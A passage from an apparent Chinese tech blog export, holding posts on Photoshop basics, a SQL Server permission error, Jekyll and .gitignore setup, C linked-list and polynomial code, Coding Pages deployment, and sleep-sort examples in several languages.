\n选择->对选区的操作（之后会讲什么是选区）  \n滤镜->推荐用新版本的Ps的原因就在这里，新版本的Ps提供的滤镜要丰富一些，还有Camera Raw滤镜  \n视图->标尺、网格线、参考线  \n窗口->调用各种窗口（复位窗口）  \n选项栏：选择一种工具后，就会有相应的工具选项  \n工具栏：工具栏顾名思义就是各种工具，相当于一个文具盒  \n图像编辑区域、面板组  \n\n## 【2】. 首选项设置  \n历史记录->调大到200，便于撤销操作  \n性能->根据自己电脑的配置来确定  \n参考线颜色  \n\n## 【3】. 图像的格式  \na. 位图（点阵图）-> 像素   \n位图图像（bitmap）, 亦称为点阵图像或绘制图像，是由称作像素（图片元素）的单个点组成的。这些点可以进行不同的排列和染色以构成图样。当放大位图时，可以看见赖以构成整个图像的无数单个方块。扩大位图尺寸的效果是增大单个像素，从而使线条和形状显得参差不齐。然而，如果从稍远的位置观看它，位图图像的颜色和形状又显得是连续的。常用的位图处理软件是 Photoshop。  \nb. 矢量图  \n矢量图是根据几何特性来绘制图形，矢量可以是一个点或一条线，矢量图只能靠软件生成，文件占用内在空间较小，因为这种类型的图像文件包含独立的分离图像，可以自由无限制的重新组合。它的特点是放大后图像不会失真，和分辨率无关，适用于图形设计、文字设计和一些标志设计、版式设计等。  \nc. 位图工具：Photoshop中大部分操作都是直接对位图进行操作  \nd. 矢量工具：钢笔工具，文字工具  \ne. 栅格化：将矢量格式转换为位图格式  \nf. [颜色模式介绍](http://baike.baidu.com/view/1139658.htm)  \n\ng. 图片格式  \n\n![File Format.jpg](https://up-img.yonghong.tech/pic/2021/07/29-12-59-3-mQOPC4.jpg)\n\nh. 图层  \n用一张海报来举例  \n![大海报.jpg](https://up-img.yonghong.tech/pic/2021/07/29-12-59-4-qLph3q.jpg)\n\n\n## 【4】.工具栏工具的介绍  \na. 移动工具（V）  \nb. 选区工具  \n（1）选框工具（M）  \n（2）套索工具（L）  \n（3）快速选择工具、魔棒工具（W）  \n\n> 布尔运算  \n\n![布尔运算.png](https://up-img.yonghong.tech/pic/2021/07/29-12-59-5-4tQf5x.png)\n\n制作工商银行LOGO  \n\n![工行logo.jpg](https://up-img.yonghong.tech/pic/2021/07/29-12-59-6-xkHiif.jpg)\n\n\nc. 裁剪工具（C）  \n多种参考线切换（O）  \nd. 污点修复画笔工具  \ne. 画笔  \nf. 仿制图章工具  \ng. 渐变工具  \nh. 矢量工具：钢笔工具、文字工具、路径选择工具、矩形工具  \ni. 抓手工具  \nj. 放大镜  \nk. 前景色、背景色  \n\n## 【5】.常用技术  \n抠图：套索、魔棒、快速选择、蒙版  \n去水印：污点修复画笔、仿制图章  \n调整图片大小：图像->图像大小/画布大小  \n画面清晰度：滤镜->模糊、锐化  \n色彩调整  \nCamera Raw 滤镜  \n批处理：文件->脚本、自动（动作面板）  \n","categories":["技巧"],"tags":["技巧","Photoshop","Ps"]},{"title":"SQL Server 数据库报错","url":"/2018/01/2018-01-01-sql-server/","content":"\n\n添加现有数据时出现下面的报错解决办法\n\n> 附加数据库对于服务器 XX 失败。  \n> 执行 Transact-SQL 语句或批处理时发生了异常。（Microsoft.SqlServer.ConnectionInfo）  \n> 无法打开物理文件 XX 。操作系统错误5:\"5(拒绝访问。)\"。CREATE DATABASE 失败。无法创建列出的某些文件名。请查看相关错误。（Microsoft SQL Server，错误：5120）\n<!-- more -->\n\n![截图](https://up-img.yonghong.tech/pic/2021/07/29-13-00-1-HP3cPb.png)\n\n在文件夹SQL Server上右键属性\n\n![截图](https://up-img.yonghong.tech/pic/2021/07/29-13-00-2-wcyZUp.png)\n\n安全选项  \n添加Authenticates Users，编辑他的权限\n \n![截图](https://up-img.yonghong.tech/pic/2021/07/29-13-01-3-9FJeKs.png)\n\n在完全控制上打对勾  \n\n![截图](https://up-img.yonghong.tech/pic/2021/07/29-13-01-4-S7Kiss.png)\n\n\nSQL server 2012 以上的版本 还可能出现下面情况 ，这是因为数据库文件的版本和数据库版本不兼容，可以找一个中间版本的数据库版本进行兼容性转换。  \n\n![截图](https://up-img.yonghong.tech/pic/2021/07/29-13-01-5-dxOACh.png)\n\n\n\n\n","categories":["数据库"],"tags":["数据库","SQL"]},{"title":"【已解决】GitHub Metadata:No GitHub API authentication","url":"/2018/01/2018-01-26-jekyll-error-github-api/","content":"\n## 问题\n\nJekyll 配置过程中报错  `GitHub Metadata: No GitHub API authentication could be found. Some fields may be missing or have incorrect data.`\n\n<!-- more -->\n## 解决方法\n\n在 `~/.bash_profile` 文件中加上\n\n```\nexport JEKYLL_GITHUB_TOKEN='你的TOKEN'\n```\n\n即可。\n\nTOKEN 需要在 GitHub 上申请，Settings->Developer settings->Personal access tokens，然后 Generate new token，在 public-repo 前面打上对勾，复制下来 token，写入 `~/.bash_profile` 文件中，执行 `source ~/.bash_profile` 即可。\n\n![生成 TOKEN](/images/post/jekyll/token.png)\n\n测试是否添加成功，命令行中输入 `echo $JEKYLL_GITHUB_TOKEN`，如果打印出你申请的 TOKEN 那么说明已经添加成功了。\n\n## 番外\n\n本人在完成这一些配置之后，再次打开 terminal 运行之后，发现还是报错，仔细查看之后发现 macOS 不会自动加载 `~/.bash_profile` 文件，解决方法也很简单，本人用的 terminal 是 zsh，只需要在 `~/.zshrc` 文件末尾加上 \n\n```\nsource .bash_profile\n```\n\n即可。\n\n\n","categories":["Jekyll"],"tags":["GitHub","Jekyll"]},{"title":".gitignore文件的配置","url":"/2018/01/2018-01-27-gitignore%E6%96%87%E4%BB%B6%E7%9A%84%E9%85%8D%E7%BD%AE/","content":"\n> 对于本 Blog 来说，在上传到 GitHub 中时，并不需要上传 `_site` 和 `_drafts` 目录中的内容，此时便可以设置 `.gitignore` 文件。\n\n有些时候，你必须把某些文件放到Git工作目录中，但又不能提交它们，比如保存了数据库密码的配置文件啦，等等。\n\n好在 Git 考虑到了大家的感受，这个问题解决起来也很简单，在 Git 工作区的根目录下创建一个特殊的 `.gitignore` 文件，然后把要忽略的文件名填进去，Git 就会自动忽略这些文件。\n\n<!-- more -->\n\n不需要从头写 `.gitignore` 文件，GitHub 已经为我们准备了各种配置文件，只需要组合一下就可以使用了。所有配置文件可以直接在线浏览：\n\n[https://github.com/github/gitignore](https://github.com/github/gitignore)\n\n## 忽略文件的原则\n\n忽略文件的原则是：\n\n1. 忽略操作系统自动生成的文件，比如缩略图等；\n2. 忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如 Java 编译产生的 `.class` 文件；\n3. 忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。\n\n\n## 例子\n\n假设你在 Windows 下进行 Python 开发， Windows 会自动在有图片的目录下生成隐藏的缩略图文件，如果有自定义目录，目录下就会有 `Desktop.ini` 文件，因此你需要忽略 Windows 自动生成的垃圾文件：\n\n```\n# Windows:\nThumbs.db\nehthumbs.db\nDesktop.ini\n```\n\n然后，继续忽略Python编译产生的 `.pyc` 、 `.pyo` 、 `dist` 等文件或目录：\n\n```\n# Python:\n*.py[cod]\n*.so\n*.egg\n*.egg-info\ndist\nbuild\n```\n\n加上你自己定义的文件，最终得到一个完整的 `.gitignore` 文件，内容如下：\n\n```\n# Windows:\nThumbs.db\nehthumbs.db\nDesktop.ini\n\n# Python:\n*.py[cod]\n*.so\n*.egg\n*.egg-info\ndist\nbuild\n\n# My configurations:\ndb.ini\ndeploy_key_rsa\n```\n\n最后一步就是把 `.gitignore` 也提交到 Git，就完成了！当然检验 `.gitignore` 的标准是 `git status` 命令是不是说 `working directory clean` 。\n\n## Windows 下创建 `.gitignore` 文件\n\n方法一（最直接）：\n在资源管理创建文件时，文件命名 `.gitignore.`，注意结尾有个 `.` 号，回车确认时系统会自动存成 `.gitignore`。\n\n方法二：\n打开文本编辑器，保存时文件名输入 `.gitignore`，保存类型选 `所有文件`。\n\n方法三：\n进入 cmd 命令行，执行 `echo > .gitignore` 输入空内容并创建文件，或执行 `rename somefile .gitignore、copy somefile .gitignore` 从已有文件复制、重命名。\n\n## 强制添加到 Git\n\n有些时候，你想添加一个文件到 Git，但发现添加不了，原因是这个文件被 `.gitignore` 忽略了：\n\n```shell\n$ git add App.class\nThe following paths are ignored by one of your .gitignore files:\nApp.class\nUse -f if you really want to add them.\n```\n\n如果你确实想添加该文件，可以用 `-f` 强制添加到 Git：\n\n```shell\n$ git add -f App.class\n```\n\n或者你发现，可能是 \t`.gitignore` 写得有问题，需要找出来到底哪个规则写错了，可以用 `git check-ignore` 命令检查：\n\n```shell\n$ git check-ignore -v App.class\n.gitignore:3:*.class    App.class\n```\n\nGit 会告诉我们，`.gitignore` 的第3行规则忽略了该文件，于是我们就可以知道应该修订哪个规则。\n\n## 小结\n忽略某些文件时，需要编写 `.gitignore` 。\n\n`.gitignore` 文件本身要放到版本库里，并且可以对 `.gitignore` 做版本管理！\n\n\n## 参考\n\n[廖雪峰的官方网站-忽略特殊文件](https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/0013758404317281e54b6f5375640abbb11e67be4cd49e0000)\n\n\n\n","tags":["git"]},{"title":"链表的C语言实现","url":"/2018/01/2018-01-29-link-list/","content":"\n链表的C语言实现\n\n<!-- more -->\n\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\nstruct Node;\n\ntypedef int ElementType;\ntypedef struct Node *PtrToNode;\ntypedef PtrToNode List;\ntypedef PtrToNode Position;\n\nstruct Node {\n\tElementType Element;\n\tPosition Next;\n};\n\nList MakeEmpty(List L);\nint isEmpty(List L);\nint IsLast(Position P);\nPosition Find(ElementType X, List L);\nvoid Delete(ElementType X, List L);\nPosition FindPrevious(ElementType X, List L);\nvoid Insert(ElementType X, List L, Position P);\nvoid DeleteList(List L);\nvoid PrintList(List L);\nPosition Header(List L);\nPosition First(List L);\nPosition Advance(Position P);\nElementType Retrieve(Position P);\nvoid FatalError(const char str[]);\n\nList MakeEmpty(List L) {\n\tPosition P, Tem;\n\tP = L->Next;\n\tL->Next = NULL;\n\twhile (P != NULL) {\n\t\tTem = P->Next;\n\t\tfree(P);\n\t\tP = Tem;\n\t}\n\treturn L;\n}\n\nint isEmpty(List L) {\n\treturn L->Next == NULL;\n}\n\nint IsLast(Position P) {\n\treturn P->Next == NULL;\n}\n\nPosition Find(ElementType X, List L) {\n\tPosition P;\n\tP = L->Next;\n\twhile (P != NULL && P->Element != X) {\n\t\tP = P->Next;\n\t}\n\treturn P;\n}\n\nvoid Delete(ElementType X, List L) {\n\tPosition P, TemCell;\n\tP = FindPrevious(X, L);\n\tif(!IsLast(P)) {\n\t\tTemCell = P->Next;\n\t\tP->Next = TemCell->Next;\n\t\tfree(TemCell);\n\t}\n}\n\nPosition FindPrevious(ElementType X, List L) {\n\tPosition P;\n\tP = L;\n\twhile (P != NULL && P->Next->Element != X) {\n\t\tP = P->Next;\n\t}\n\treturn P;\n}\n\nvoid Insert(ElementType X, List L, Position P) {\n\tPosition TemCell;\n\tTemCell = (struct Node *)malloc(sizeof(struct Node));\n\tif (TemCell == NULL) {\n\t\tFatalError(\"Out of space!!!\");\n\t}\n\tTemCell->Element = X;\n\tTemCell->Next = P->Next;\n\tP->Next = TemCell;\n}\n\nvoid DeleteList(List L) {\n\tPosition P, Tem;\n\tP = L->Next;\n\tfree(L);\n\twhile (P != NULL) {\n\t\tTem = P->Next;\n\t\tfree(P);\n\t\tP = Tem;\n\t}\n}\n\nvoid PrintList(List L) {\n\tPosition P;\n\tP = L->Next;\n\twhile (P != NULL) {\n\t\tprintf(\"%d \", P->Element);\n\t\tP = P->Next;\n\t}\n}\n\nvoid FatalError(const char str[]) {\n\tprintf(\"%s\", str);\n}\n\nint main() {\n\tList L = (struct Node *)malloc(sizeof(struct Node));\n\tL->Next = NULL;\n\tInsert(3, L, L);\n\tInsert(2, L, L);\n\tInsert(1, L, L->Next);\n\tPrintList(L);\n\treturn 0;\n}\n```","categories":["数据结构"],"tags":["C++","C","数据结构"]},{"title":"多项式加法的C语言实现","url":"/2018/01/2018-01-30-poly-add/","content":"\n链表的三个主要例子之一，多项式加法\n\n<!-- more -->\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\ntypedef struct Node *PtrToNode;\n\nstruct Node {\n\tint Coefficient;\t// 系数\n\tint Exponent;\t\t// 指数\n\tPtrToNode Next;\n};\n\ntypedef PtrToNode Polynomial;\t\t// 多项式\n\nPtrToNode CreatPoly();\nvoid Insert(int Coefficient, int Exponent, Polynomial Poly);\nPolynomial AddPoly(Polynomial Polya, Polynomial Polyb);\n\nPolynomial CreatPoly() {\n\tPtrToNode head = (PtrToNode)malloc(sizeof(struct Node));\n\thead->Next = NULL;\n\tint Coefficient, Exponent;\n\t// 输入为系数指数，以-1结束\n\twhile(~scanf(\"%d\", &Coefficient) && Coefficient != -1) {\n\t\tscanf(\"%d\", &Exponent);\n\t\tInsert(Coefficient, Exponent, head);\n\t}\n\treturn head;\n}\n\nPolynomial AddPoly(Polynomial Polya, Polynomial Polyb) {\n\tPtrToNode head = (PtrToNode)malloc(sizeof(struct Node));\n\thead->Next = NULL;\n\tint Coefficient, Exponent;\n\tPtrToNode p;\n\tp = Polya->Next;\n\twhile (p != NULL) {\n\t\tInsert(p->Coefficient, p->Exponent, head);\n\t\tp = p->Next;\n\t}\n\tp = Polyb->Next;\n\twhile (p != NULL) {\n\t\tInsert(p->Coefficient, p->Exponent, head);\n\t\tp = p->Next;\n\t}\n\treturn head;\n}\n\nvoid Insert(int Coefficient, int Exponent, Polynomial Poly) {\n\tPtrToNode p;\n\tp = Poly;\n\t\n\t// 注意判断是不是空链表，即第一个插入的元素\n\twhile (p->Next != NULL && p->Next->Exponent > Exponent) {\n\t\tp = p->Next;\n\t}\n\t\n\tif(p->Next != NULL && p->Next->Exponent == Exponent) {\n\t\tp->Next->Coefficient += Coefficient;\n\t}\n\telse {\n\t\tPtrToNode node = (PtrToNode)malloc(sizeof(struct Node));\n\t\tnode->Coefficient = Coefficient;\n\t\tnode->Exponent = Exponent;\n\t\tnode->Next = p->Next;\n\t\tp->Next = node;\n\t}\n}\n\nvoid PrintPoly(Polynomial Poly) {\n\tPtrToNode p;\n\tp = Poly->Next;\n\twhile (p != NULL) {\n\t\tprintf(\"%dx^%d\", p->Coefficient, p->Exponent);\n\t\tif(p->Next != NULL) \n\t\t\tprintf(\" + \");\n\t\tp = p->Next;\n\t}\n\tprintf(\"\\n\");\n}\n\nint main() {\n\tPolynomial polya = CreatPoly();\n\tPrintPoly(polya);\n\tPolynomial polyb = CreatPoly();\n\tPrintPoly(polyb);\n\tPolynomial polyc = AddPoly(polya, polyb);\n\tPrintPoly(polyc);\n\treturn 0;\n}\n```","categories":["数据结构"],"tags":["C++","C","数据结构","多项式加法"]},{"title":"在 Coding.net 上部署 WordPress 和 ThinkPHP","url":"/2018/02/2018-02-13-wordpress-on-coding-pages/","content":"\n和 Git Pages 一样，Coding.net 也提供了 [Coding Pages](https://coding.net/pages/) 的服务。\n\n## 为什么采用 [Coding Pages](https://coding.net/pages/)\n\n相比 Git Pages，Coding Pages 服务器在香港，国内外访问页面都可以很流畅，并且全新支持动态页面部署\n\n> 基于 Linux 系统的虚拟机环境。\n> 率先支持部署 PHP 语言程序。\n> 完整的 MySQL 数据库功能。\n\n<!-- more -->\n\n## 部署 [WordPress](https://wordpress.org/)\n\n可以参考 [Coding 帮助文档](https://coding.net/help/doc/pages/dpages.html)\n\n## 部署 [ThinkPHP](http://www.thinkphp.cn/)\n\n步骤和上面部署 WordPress 类似，这里需要注意，ThinkPHP 需要修改 URL 重写的配置，参考 [TP5开发手册-URL重写](https://www.kancloud.cn/manual/thinkphp5/177576)，由于没有修改服务器配置的权限，需要修改 index.php 文件。另外，在 Coding Pages 的设置页面上设置网站入口为 /public。\n\n## 绑定自定义域名\n\n可以参考 [Coding 帮助文档](https://coding.net/help/doc/pages/domain.html)\n\n在这里需要注意，如果安装完 WordPress 之后在绑定自定义域名，可能会导致管理界面进不去，这是因为在 WordPress 数据库中存储了安装时候的 Url，所以在提交登录表单的时候会指向原来的域名，然后自动跳转到自定义域名，导致无法登录。\n\n解决办法：\n\n从 Coding Pages 管理界面进入 phpMyAdmin, 修改存储的 Url 的 wp_options 表的前两项 siteUrl 和 home.\n\n![Modify Url](https://up-img.yonghong.tech/pic/2021/07/29-13-03-modify-url-u3L95Z.png)\n\n修改后再次刷新，就可以进入管理界面了。\n\n","categories":["Coding Pages"],"tags":["Coding Pages","WordPress","ThinkPHP"]},{"title":"U模式笔画输入","url":"/2018/02/2018-02-17-sougou-u/","content":"\n# U模式笔画输入\n\nU模式主要用来输入不会读（不知道拼音）的字等。在按下u键后，输入笔画拼音首字母或者组成部分拼音，即可得到您想要的字。\n\n由于双拼占用了u键，所以双拼下需要按shift+u进入u模式。 \n\n<!-- more -->\n\nu模式下的具体操作有： \n\n## 一、笔画输入 \n仅通过输入文字构成笔画的拼音首字母来打出想要的字。例如：【木】字由横（h）、竖（s）、撇（p）、捺（n）构成，因此： \n\n![](https://up-img.yonghong.tech/pic/2021/07/29-13-13-help_3810-ya2q0Q.png)\n\n其实 ![](https://up-img.yonghong.tech/pic/2021/07/29-13-13-help_3811-QPwavp.png) 为笔画提示区，上方是常见笔画：「一 丨 丿 丶 乛」，右下方为各笔画拼音的首字母。 您可以在此区域用鼠标点击输入笔画，也可以通过键盘敲入hspnz等输入笔画。具体笔画以及对应的按键如下： \n\n![](https://up-img.yonghong.tech/pic/2021/07/29-13-14-help_3812-uECZ0t.png)\n\n键盘上的1、2、3、4、5也代表h、s、p、n、z。 \n需要注意的是：【忄】的笔顺是点点竖（dds），不是竖点点、点竖点。 \n## 二、拆分输入 \n将一个汉字拆分成多个组成部分，u模式下分别输入各部分的拼音即可得到对应的汉字。如【林】字，可拆分为两个独立的【木】字： \n\n![](https://up-img.yonghong.tech/pic/2021/07/29-13-14-help_3813-B9JRiE.png)\n\n又如【曙】字，可以拆分成【日】【罒】和【者】，于是：\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-13-14-help_3814-sHBD4g.png)\n\n也可以做部首拆分输入。如【氻】，可拆分为【 氵】和【力】 \n\n![](https://up-img.yonghong.tech/pic/2021/07/29-13-14-help_3815-pekb6b.png)\n\n下表列出了常见部首的拼写输入\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-13-14-help_3816-0pWZGb.png)\n\n## 三、笔画拆分混输 \n您还可以进行“笔画+拆分”混合操作。例如：【羿】。 \n\n![](https://up-img.yonghong.tech/pic/2021/07/29-13-15-help_3817-m8XATW.png)\n\n## 四、参考\n\n[U模式笔画输入](https://pinyin.sogou.com/help.php?list=3&q=8)\n\n","categories":["技巧"],"tags":["技巧","搜狗","U模式"]},{"title":"喵喵 喵喵喵 喵 喵喵呜 喵喵喵喵","url":"/2018/02/2018-02-18-miao-miao-miao/","content":"\n看到一段代码十分有意思，的确可以执行。\n\n<!-- more -->\n\n```c\n#define 喵喵喵 main \n#define 喵喵 int \n#define 喵 ( \n#define 喵喵呜 ) \n#define 喵喵喵喵 { \n#define 喵呜喵 } \n#define 喵呜喵呜喵 printf \n#define 呜 \"\\n\" \n#define 喵呜喵呜 return \n#define 呜喵 0 \n#define 喵呜 ; \n#include <stdio.h> \n喵喵 喵喵喵 喵 喵喵呜 喵喵喵喵 \n喵呜喵呜喵 喵 \"喵喵喵! \" 呜 喵喵呜 喵呜 \n喵呜喵呜 呜喵 喵呜 \n喵呜喵\n```\n\n![miao](https://up-img.yonghong.tech/pic/2021/07/29-13-16-miao-GvGmPn.png)\n","categories":["代码"],"tags":["代码","喵"]},{"title":"2018年1月份 GitHub 上最热门的 Java 项目","url":"/2018/02/2018-02-19-java-good-project-on-github/","content":"\n## 1.安卓反编译 Gui 工具 jadx\n\n[https://github.com/skylot/jadx](https://github.com/skylot/jadx) Star 13804\n\njadx是一个非常好用的android反编译gui工具，功能非常的强大，有较为完善的gui界面，已经成为很多开发者的反编译工具首选，jadx 主要功能如下：\n\n● 支持全局class查询\n\n● 支持全局text查询\n\n● 支持导出gradle工程\n\n<!-- more -->\n\n## 2.bytecode-viewer\n\n[https://github.com/Konloch/bytecode-viewer](https://github.com/Konloch/bytecode-viewer) Star 9042\n\nbytecodeviewer是一款简单易用功能强大的反编译软件。它是一款基于图形界面的Java反编译器，Java字节码编辑器，APK编辑器，Dex编辑器，APK反编译器，DEX反编译器。不仅如此，它还是一款Hex查看器，代码搜索器和代码调试器。除此之外，它还具备Smali和Baksmali等汇编器的相关功能。\n\n## 3.面试指南interviews\n\n[https://github.com/kdn251/interviews](https://github.com/kdn251/interviews) Star 18301\n\nJava工程师面试指南，里面涵盖几乎所有软件工程师面试时会碰到的问题以及答案。\n\n\n## 4.java-design-patterns\n\n[https://github.com/iluwatar/java-design-patterns](https://github.com/iluwatar/java-design-patterns) Star 29389\n\nDesign patterns 是程序员在设计应用程序或系统时可用来解决常见问题的最佳实践手册。它可以帮助你加快开发进程，有效防止一些可能导致重大失误的细节问题，不过深入了解 java-design-patterns 之前，你应提前熟悉各种编程/软件设计原则。\n\n\n## 5.spring-boot\n\n[https://github.com/spring-projects/spring-boot](https://github.com/spring-projects/spring-boot)  Star 20112\n\n从最根本上来讲，Spring Boot 就是一些库的集合，它能够被任意项目的构建系统所使用。简便起见，该框架也提供了命令行界面，它可以用来运行和测试Boot应用。框架的发布版本，包括集成的CLI（命令行界面），可以在Spring仓库中手动下载和安装。\n\n具有如下特性：\n\n● 创建独立的Spring应用程序\n\n● 嵌入的Tomcat，无需部署WAR文件\n\n● 简化Maven配置\n\n● 自动配置Spring\n\n● 提供生产就绪型功能，如指标，健康检查和外部配置\n\n● 绝对没有代码生成和对XML没有要求配置\n\n\n## 6.smartTable\n\n[https://github.com/huangyanbin/smartTable](https://github.com/huangyanbin/smartTable) Star 1200\n\nSmartTable 是一套数据源使用 Ajax 获取数据，并展现成表格与图像的形式，并且支持下载（思路源于talkingdata）的智能表格。开源引入：Bootstrap 3.0，Bootstrap respond (IE解决方案)，Jquery 11.02，dataTables，echarts，table2CSV\n\n\n## 7.dubbo\n\n[https://github.com/alibaba/dubbo](https://github.com/alibaba/dubbo) Star 11919\n\n\nDubbo 是阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，可以和 Spring 框架无缝集成。主要核心部件：\n\n● Remoting: 网络通信框架，实现了 sync-over-async 和 request-response 消息机制\n\n● RPC: 一个远程过程调用的抽象，支持负载均衡、容灾和集群功能\n\n● Registry: 服务目录框架用于服务的注册和服务事件发布和订阅\n\n\n## 8.rejoiner\n\n[https://github.com/google/rejoiner](https://github.com/google/rejoiner) Star 1269\n\nrejoiner能够从gRPC微服务和其他Protobuf源生成统一的GraphQL schema，具有以下功能：\n\n● 从微服务创建统一的GraphQL模式\n\n● 可灵活定义GraphQL模式并组成共享组件\n\n● 从Proto定义生成GraphQL类型\n\n● 基于GraphQL查询参数填充请求Proto\n\n● 提供一个DSL来修改生成的模式\n\n● 通过注释获取数据的方法来加入数据源\n\n● 基于GraphQL选择器创建Proto FieldMasks\n\n## 9.zheng\n\n[https://github.com/shuzheng/zheng](https://github.com/shuzheng/zheng) Star 7654\n\n\n基于Spring+SpringMVC+Mybatis分布式敏捷开发系统架构，提供整套公共微服务服务模块：集中权限管理（单点登录）、内容管理、支付中心、用户管理（支持第三方登录）、微信平台、存储系统、配置中心、日志分析、任务和通知等，支持服务治理、监控和追踪，努力为中小型企业打造全方位J2EE企业级开发解决方案。\n\n\n## 10.JavaScript 控件 TableView\n\n[https://github.com/evrencoskun/TableView](https://github.com/evrencoskun/TableView) Star 1218\n\nTableView是一个用于显示数据表格的JavaScript控件，集成的分页控件，可对表格中的数据集进行客户端分页，亦可对表格中的数据集进行客户端排序，JavaScript 控件：\n\n● TableView(数据表格控件), 可配置标题, 计数, 行复选框, 过滤器, 分页, 排序, 多选\n\n● PagerView(分页控件)\n\n● SortView(排序控件)\n\n\n## 11.elasticsearch\n\n[https://github.com/elastic/elasticsearch](https://github.com/elastic/elasticsearch) Star 28401\n\n\nElasticsearch 是一个分布式的 RESTful 风格的搜索和数据分析引擎，能够解决越来越多的用例。作为 Elastic Stack 的核心，它集中存储您的数据，帮助您发现意料之中以及意料之外的情况。Elasticsearch 是一个实时的分布式搜索分析引擎， 它能让你以一个之前从未有过的速度和规模，去探索你的数据。 它被用作全文检索、结构化搜索、分析以及这三个功能的组合\n\n","categories":["Github-Java"],"tags":["Java","Github"]},{"title":"天才排序算法——睡眠排序","url":"/2018/02/2018-02-19-sleep-sort/","content":"\n今天看到一个新的排序法 睡排序 真的是脑洞大开。。。\n\n据说是 4chan 匿名用户发的一个帖子《Genius sorting algorithm: Sleep sort》，原贴已删除。\n\n![4chan](https://up-img.yonghong.tech/pic/2021/07/29-13-20-sleep-sort-NgnMIZ.jpg)\n\nMan, am I a genius. Check out this sorting algorithm I just invented.\n朋友，我真是个天才，快来看看我刚发明的排序算法。\n\n<!-- more -->\n\n```bash\n#!/bin/bash\nfunction f() {\n    sleep \"$1\"\n    echo \"$1\"\n}\nwhile [ -n \"$1\" ]\ndo\n    f \"$1\" &\n    shift\ndone\nwait\n\nexample usage:\n./sleepsort.bash 5 3 6 3 6 3 1 4 7\n```\n\n> 估计有大部分人不知道把，原理是构造 n 个线程，它们和这 n 个数一一对应。初始化后，线程们开始睡眠，等到对应的数那么多个时间单位后各自醒来，然后输出它对应的数。这样最小的数对应的线程最早醒来，这个数最早被输出。等所有线程都醒来，排序就结束了。\n\n再帖几个其他常用版本：\n\nJava 版\n\n```java\npublic class SleepSort {  \n    public static void main(String[] args) {  \n        int[] ints = {1,4,7,3,8,9,2,6,5};  \n        SortThread[] sortThreads = new SortThread[ints.length];  \n        for (int i = 0; i < sortThreads.length; i++) {  \n            sortThreads[i] = new SortThread(ints[i]);  \n        }  \n        for (int i = 0; i < sortThreads.length; i++) {  \n            sortThreads[i].start();  \n        }  \n    }  \n}  \nclass SortThread extends Thread{  \n    int ms = 0;  \n    public SortThread(int ms){  \n        this.ms = ms;  \n    }  \n    public void run(){  \n        try {  \n            sleep(ms*10+10);  \n        } catch (InterruptedException e) {  \n            // TODO Auto-generated catch block  \n            e.printStackTrace();  \n        }  \n        System.out.println(ms);  \n    }  \n}  \n```\n\nPHP 版\n\n```php\n<?php  \n$pids = array();  \nfor ($i=1; $i<$argc; $i++)  \n{  \n        if (($pid = pcntl_fork()) == 0)  \n        {  \n                $sleep = intval($argv[$i]);  \n                sleep($sleep);  \n                echo $sleep.\"\\n\";  \n                exit();  \n        }  \n        else if ($pid == -1)  \n        {  \n                die();  \n        }  \n        else  \n        {  \n                $pids[] = $pid;  \n        }  \n}  \n  \nforeach($pids as $pid)  \n        pcntl_waitpid($pid, $status);  \n?>  \n  \nphp sleepsort.php 1 3 5 6 2  \n```\n\nJavaScript 版\n\n```js\nfunction lazySort(list, callback) {  \n    var result = [];  \n  \n    list.forEach(function(i) {  \n        setTimeout(function() {  \n            result.push(i);  \n              \n            if(result.length == list.length) {  \n                callback(result);  \n            }  \n        }, i);  \n    });  \n}  \n  \nlazySort([4,5,7,1,2,4,5], alert);  \n```\n\nRuby 版\n\n```ruby\nARGV.each { |e| fork { sleep(e.to_f/1000); puts e } }  \n```\n\n下面👇是转载的一些评论：\n\n路人A：\n\n> Oh god, it works.  \nBut I don't like to wait 218382 seconds to sort '(0 218382)  \n哦，春哥，它居然能用，但我不想用218382秒去排(0 218382)  \n\n\n\n路人B：\n\n> If the difference between any two of the numbers is too small, race conditions will fuck you up the ass.  \n如果两个数之间的差距太小，竞态条件就要爆你菊花了。\n\n\n路人C：\n\n> What about   \n./sleepsort -1 -2 -3 ?  \nIf you slept exp(n) instead of n it could easily include negative integers too!  \n排-1 -2 -3怎么办？如果你睡exp(n)而不是n，它就能包含负数了。  \n\n\n\n路人D：\n\n> Someone email this to Knuth  \n你可以给Knuth发邮件了 \n\n\n\n路人E：\n\n> I think thats brilliant :)  \nWould be fun to design a hardware sorter, based on this..  \n这招挺高，可以根据这个设计一个硬件排序器  \n\n\n\n路人F：\n\n> This has a best case O(n) and an infinity high worst case. (because its 0(n * Constant) and the constant could be much greater than n)  \n它有一个最好的O(n)的时间复杂度和一个无穷大的最坏复杂度，因为这个常数可能比n大的多的多  \n\n\n\n路人G：\n\n> I heartily disagree with all the attempts to downplay the brilliance of the sleep sort algorithm. Many of you have missed the important point that while traditional sorting algorithms can only utilize one core, sleep sort has the capacity to use the full power of a massively parallel execution environment.\nGiven that you need nearly no computing in each of the threads, you can implement them using low-power CPUs, so this is in fact a GREEN COMPUTING algorithm.  \nOh, and did I mention that the algorithm can also run inside a cloud...?\nSure, you're a genius!  \n我由衷的不同意那些低估sleepsort这个天才算法的举动，许多人可能忽略了一个重点那就是传统的排序只能利用一个核心，而sleepsort有这个能力充分利用可以做大量并行计算的环境。  \n在每个线程中给出你几乎不需要计算的部分，你可以用低性能CPU搞定它们，所以事实上，这是一个“绿色计算”算法。  \n还有我提到的这个方法能在云端运行不？  \n总之，你是个天才！  \n\n\n路人H：\n\n> pretty fucking cool !  \n真是太TM的cool了！  ","categories":["代码"],"tags":["算法","排序算法"]},{"title":"交换两个变量的值，不使用第三个变量的几种方法","url":"/2018/02/2018-02-20-ab-ba/","content":"\n## 题目\n\n题目：已知两变量a和b，设计一个算法，交换a与b的值。\n\n<!-- more -->\n\n## 原始方法\n\n1、最传统，最广泛，最著名的方法，增加一个变量，代码如下：\n\n```c\nint a, b;\nint c;\nc=a;\na=b;\nb=c;\n```\n\n## 不引入变量的方法\n\n2、不增加第三个变量，交换a和b的值\n\n2.1、 方法一：加减运算\n\n```c\nint a, b;\na = a+b;\nb = 